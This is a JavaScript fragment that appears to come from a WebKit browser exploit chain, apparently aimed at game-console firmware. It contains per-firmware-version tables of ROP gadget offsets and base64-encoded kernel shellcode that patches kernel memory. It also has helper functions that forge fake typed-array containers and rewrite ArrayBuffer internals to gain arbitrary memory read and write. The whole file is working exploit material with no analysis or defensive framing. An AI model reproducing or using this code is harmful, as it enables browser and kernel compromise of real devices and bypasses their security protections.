        return webkit_base.add(0x6e975);
      },
      get wk_MOV_QWORD_PTR_RDI_RAX_RET() {
        return webkit_base.add(0x8b1b);
      },
      get wk_MOV_RAX_QWORD_PTR_RDI_RET() {
        return webkit_base.add(0x8450);
      },
      get wk_PUSH_QWORD_PTR_RBX_JMP_QWORD_PTR_RAX() {
        return webkit_base.add(0xf10aae);
      },
      make_fake_container(jscell) {
        const container = {
          jscell: jscell, // NaN-boxed, fix later
          butterfly: null, // becomes 0x2, fix later
          vector: arw.victim,
          length: true, // becomes 0x7, fix later
          byteOffset: null, // becomes 0x2, fix later
          mode: null, // becomes 0x2, fix later
        };

        delete container.butterfly; // becomes 0
        delete container.byteOffset; // becomes 0
        delete container.mode; // becomes 0

        return container;
      },
      make_master(victim_addr) {
        arw.victim.setBInt(0x10, victim_addr, true);
        arw.victim.setBInt(impl.wk_TypedArray_m_byteOffset, 0, true);
        arw.victim.setBInt(impl.wk_TypedArray_m_mode, 0x30, true); // TypedArrayMode:OversizeTypedArray
      },
      ab_fake(ab, addr, len) {
        const ab_addr = arw.addrof(ab);
        const m_impl = arw.view(ab_addr).getBInt(0x10, true);
        const m_data = arw.view(m_impl).getBInt(0x10, true);

        ab.m_data = m_data;

        arw.view(m_impl).setBInt(0, 2, true); // DeferrableRefCountedBase::m_refCount
        arw.view(m_impl).setBInt(impl.wk_ArrayBuffer_m_contents_m_data, addr, true);
        arw.view(m_impl).setBInt(impl.wk_ArrayBuffer_m_contents_m_sizeInBytes, len, true);
        arw.view(m_impl).setBInt(impl.wk_ArrayBuffer_m_contents_m_maxByteLength, len, true);
      },
      ab_free(ab) {
        const ab_addr = arw.addrof(ab);
        const m_impl = arw.view(ab_addr).getBInt(0x10, true);

        arw.view(m_impl).setBInt(0, 0, true); // DeferrableRefCountedBase::m_refCount
        arw.view(m_impl).setBInt(impl.wk_ArrayBuffer_m_contents_m_data, ab.m_data, true);
        arw.view(m_impl).setBInt(impl.wk_ArrayBuffer_m_contents_m_sizeInBytes, 0, true);
        arw.view(m_impl).setBInt(impl.wk_ArrayBuffer_m_contents_m_maxByteLength, 0, true);
      },
    },
  },
  12: {
    0: {
      k_evf_cv_desc: 0x784798,
      k_jmp_qword_ptr_rsi: 0x47b31,
      k_shellcode:
        'uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wQAAL7rBAAAv5Dp//9BuOsAAABmiYGjdhsAuOsEAABBuesAAABBuusAAABmiYHswC8AQbvrAAAAuJDp//9IgcJxeQQAZomxs3YbAGaJudN2GwBmRImB9HpiAMaBzQoAAOvGgc3TKwDrxoER1CsA68aBjdQrAOvGgdHUKwDrxoF91isA68aBLdsrAOvGgf3bKwDrZkSJid+DYgDHgZAEAAAAAAAAxoHCBAAA62ZEiZG5BAAAZkSJmbUEAADGgeYUOQDrZomBZHEbAMeBGHcbAJDpPAHHgWDYOwBIMcDDxoEapx8AN8aBHacfADfHgYAtEAECAAAASImRiC0QAceBrC0QAQEAAAAPIMBIDQAAAQAPIsAPIMBIJf///v8PIsC460gAALoEAAAARTHARTHJvgUAAABmiYFRVRIAuOsGAAC/BQAAAGaJgZNVEgBBugEAAABIuEGDv6AEAAAAQbsBAAAASImBm1USALgEAAAAZomBrVUSALhJi///x4GpVRIASYuH0MaBr1USAADHgbZVEgBJi7ewZomRulUSAMaBvFUSAADHgc5VEgBJi4dAZomx0lUSAMaB1FUSAADHgdtVEgBJi7cgZom531USAMaB4VUSAADHgfNVEgBJjb/AZkSJgfdVEgDGgflVEgAAx4H/VRIASY2/4GZEiYkDVhIAxoEFVhIAAMeBElYSAEmNvwBmRImRFlYSAMaBGFYSAADHgR5WEgBJjb8gZkSJmSJWEgDGgSRWEgAAZomBL1YSAMaBMVYSAP8PIMBIDQAAAQAPIsAxwMM=',

      lk__error: 0x299c0,

      wk_pthread_create: 0x20c8,
      wk_pthread_join: 0x2108,
      wk_expm1_builtin: 0x2585090,
      wk___imp___error: 0x3cbcc48,
      wk___imp_strerror: 0x3cbcc70,

      get wk_LEAVE_RET() {
        return webkit_base.add(0x11823);
      },
      get wk_POP_R8_RET() {
        return webkit_base.add(0x22f52);
      },
      get wk_POP_R9_RET() {
        return webkit_base.add(0x60b6c1);
      },
      get wk_POP_R10_RET() {
        return webkit_base.add(0x23ccd97);
      },
      get wk_POP_R11_RET() {
        return webkit_base.add(0x8d3719);
      },
      get wk_POP_R12_RET() {
        return webkit_base.add(0xb0d57b);
      },
      get wk_POP_R13_RET() {
        return webkit_base.add(0x88c23a);
      },
      get wk_POP_R14_RET() {
        return webkit_base.add(0x19b8a);
      },
      get wk_POP_R15_RET() {
        return webkit_base.add(0x4902e);
      },
      get wk_POP_RAX_RET() {
        return webkit_base.add(0x22f53);
      },
      get wk_POP_RBX_RET() {
        return webkit_base.add(0x85eb9);
      },
      get wk_POP_RCX_RET() {
        return webkit_base.add(0x5def9);
      },
      get wk_POP_RDX_RET() {
        return webkit_base.add(0x2aad5d);
      },
      get wk_POP_RDI_RET() {
        return webkit_base.add(0x4902f);
      },
      get wk_POP_RSI_RET() {
        return webkit_base.add(0x10e37);
      },
      get wk_POP_RSP_RET() {
        return webkit_base.add(0x60e44);
      },
      get wk_MOV_QWORD_PTR_RDI_RAX_RET() {
        return webkit_base.add(0x2b5cb);
      },
      get wk_MOV_RAX_QWORD_PTR_RDI_RET() {
        return webkit_base.add(0x4b720);
      },
      get wk_PUSH_QWORD_PTR_RBX_JMP_QWORD_PTR_RAX() {
        return webkit_base.add(0x215eb2e);
      },
    },
    0x50: {
      k_evf_cv_desc: 0x784858,
      k_shellcode:
        'uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wQAAL7rBAAAv5Dp//9BuOsAAABmiYHjdhsAuOsEAABBuesAAABBuusAAABmiYEswS8AQbvrAAAAuJDp//9IgcJxeQQAZomx83YbAGaJuRN3GwBmRImBNHtiAMaBzQoAAOvGgQ3UKwDrxoFR1CsA68aBzdQrAOvGgRHVKwDrxoG91isA68aBbdsrAOvGgT3cKwDrZkSJiR+EYgDHgZAEAAAAAAAAxoHCBAAA62ZEiZG5BAAAZkSJmbUEAADGgSYVOQDrZomBpHEbAMeBWHcbAJDpPAHHgaDYOwBIMcDDxoFapx8AN8aBXacfADfHgYAtEAECAAAASImRiC0QAceBrC0QAQEAAAAPIMBIDQAAAQAPIsAxwMM=',

      lk__error: 0xd9d0,

      wk_expm1_builtin: 0x2585110,
      wk___imp___error: 0x3cb4c48,
      wk___imp_strerror: 0x3cb4c70,

      get wk_LEAVE_RET() {
        return webkit_base.add(0x77caa);
      },
      get wk_POP_R10_RET() {
        return webkit_base.add(0x0);
      },
      get wk_PUSH_QWORD_PTR_RBX_JMP_QWORD_PTR_RAX() {
        return webkit_base.add(0x215ebae);
      },
    },
  },
  13: {
    0: {
      k_evf_cv_desc: 0x7849d8,
      k_shellcode:
        'uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wQAAL7rBAAAv5Dp//9BuOsAAABmiYHjdhsAuOsEAABBuesAAABBuusAAABmiYFMwS8AQbvrAAAAuJDp//9IgcJxeQQAZomx83YbAGaJuRN3GwBmRImBhHtiAMaBzQoAAOvGgS3UKwDrxoFx1CsA68aB7dQrAOvGgTHVKwDrxoHd1isA68aBjdsrAOvGgV3cKwDrZkSJiW+EYgDHgZAEAAAAAAAAxoHCBAAA62ZEiZG5BAAAZkSJmbUEAADGgUYVOQDrZomBpHEbAMeBWHcbAJDpPAHHgcDYOwBIMcDDxoF6px8AN8aBfacfADfHgYAtEAECAAAASImRiC0QAceBrC0QAQEAAAAPIMBIDQAAAQAPIsAxwMM=',

      lk__error: 0x26420,

      wk_expm1_builtin: 0x2586880,
      wk___imp___error: 0x3cb8cc8,
      wk___imp_strerror: 0x3cb8cf0,

      get wk_LEAVE_RET() {
        return webkit_base.add(0x182f7);
      },
      get wk_POP_R8_RET() {
        return webkit_base.add(0x9b311);
      },
      get wk_POP_R9_RET() {
        return webkit_base.add(0x1dcfb1);
      },
      get wk_POP_R11_RET() {
        return webkit_base.add(0xc01071);
      },
      get wk_POP_R12_RET() {
        return webkit_base.add(0x200079);
      },
      get wk_POP_R13_RET() {
        return webkit_base.add(0xc5c7a);
      },
      get wk_POP_R14_RET() {
        return webkit_base.add(0xa5e91);
      },
      get wk_POP_R15_RET() {
        return webkit_base.add(0x5c47f);
      },
      get wk_POP_RAX_RET() {
        return webkit_base.add(0x10504);
      },
      get wk_POP_RBX_RET() {
        return webkit_base.add(0x79e8);
      },
      get wk_POP_RCX_RET() {
        return webkit_base.add(0x1bade);
      },
      get wk_POP_RDX_RET() {
        return webkit_base.add(0x12c5ba);
      },
      get wk_POP_RDI_RET() {
        return webkit_base.add(0x5c480);
      },
      get wk_POP_RSI_RET() {
        return webkit_base.add(0x6e45e);
      },
      get wk_POP_RSP_RET() {
        return webkit_base.add(0x6f017);
      },
      get wk_MOV_QWORD_PTR_RDI_RAX_RET() {
        return webkit_base.add(0x548b);
      },
      get wk_MOV_RAX_QWORD_PTR_RDI_RET() {
        return webkit_base.add(0xdeea0);
      },
      get wk_PUSH_QWORD_PTR_RBX_JMP_QWORD_PTR_RAX() {
        return webkit_base.add(0x2289e8e);
      },
    },
    0x50: {
      k_evf_cv_desc: 0x785228,
      k_shellcode:
        'uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wQAAL7rBAAAv5Dp//9BuOsAAABmiYEDdxsAuOsEAABBuesAAABBuusAAABmiYGsxC8AQbvrAAAAuJDp//9IgcJxeQQAZomxE3cbAGaJuTN3GwBmRImBxH9iAMaBzQoAAOvGgU3UKwDrxoGR1CsA68aBDdUrAOvGgVHVKwDrxoH91isA68aBrdsrAOvGgX3cKwDrZkSJia+IYgDHgZAEAAAAAAAAxoHCBAAA62ZEiZG5BAAAZkSJmbUEAADGgRYZOQDrZomBxHEbAMeBeHcbAJDpPAHHgRDdOwBIMcDDxoGapx8AN8aBnacfADfHgYAtEAECAAAASImRiC0QAceBrC0QAQEAAAAPIMBIDQAAAQAPIsAxwMM=',

      lk__error: 0x1a0f0,
    },
    0x52: {
      k_shellcode:
        'uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wQAAL7rBAAAv5Dp//9BuOsAAABmiYGjdxsAuOsEAABBuesAAABBuusAAABmiYGsyC8AQbvrAAAAuJDp//9IgcIQ1QQAZomxs3cbAGaJudN3GwBmRImBxINiAMaBzQoAAOvGge3UKwDrxoEx1SsA68aBrdUrAOvGgfHVKwDrxoGd1ysA68aBTdwrAOvGgR3dKwDrZkSJia+MYgDHgZAEAAAAAAAAxoHCBAAA62ZEiZG5BAAAZkSJmbUEAADGgRYdOQDrZomBZHIbAMeBGHgbAJDpPAHHgRDhOwBIMcDDxoE6qB8AN8aBPagfADfHgYAtEAECAAAASImRiC0QAceBrC0QAQEAAAAPIMBIDQAAAQAPIsAxwMM=',
    },
  },
  14: {
    0: {
      k_evf_cv_desc: 0x7854e8,
      k_jmp_qword_ptr_rsi: 0x250be,
      k_shellcode:
        'uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wQAAL7rBAAAv5Dp//9BuOsAAABmiYFDehsAuOsEAABBuesAAABBuusAAABmiYFcyy8AQbvrAAAAuJDp//9IgcL+TgIAZomxU3obAGaJuXN6GwBmRImBhIZiAMaBzQoAAOvGgZ3XKwDrxoHh1ysA68aBXdgrAOvGgaHYKwDrxoFN2isA68aB/d4rAOvGgc3fKwDrZkSJiW+PYgDHgZAEAAAAAAAAxoHCBAAA62ZEiZG5BAAAZkSJmbUEAADGgcYfOQDrZomBBHUbAMeBuHobAJDpPAHHgcDjOwBIMcDDxoHaqh8AN8aB3aofADfHgYAtEAECAAAASImRiC0QAceBrC0QAQEAAAAPIMBIDQAAAQAPIsAxwMM=',

      lk__error: 0x25e70,
    },
    2: {
      k_evf_cv_desc: 0x785968,
    },
  },
};

const impl_cache = new Map();
const impl = new Proxy(impl_map, {
  get(target, prop) {
    if (impl_cache.has(prop)) {
      return impl_cache.get(prop);
    }

    for (let major = version.major; major >= 0; major--) {
      if (major in target) {
        const minor_max = major === version.major ? version.minor : 0xff;

        for (let minor = minor_max; minor >= 0; minor--) {
          if (minor in target[major] && prop in target[major][minor]) {
            const value = target[major][minor][prop];
            if (value === null) {
              throw new Error(`${prop} is not supported for ${version}`);
            }

            if (value !== undefined) {
              impl_cache.set(prop, value);
              return value;
            }
          }
        }
      }
    }

    throw new Error(`${version} has no ${prop} !!`);
  },
});
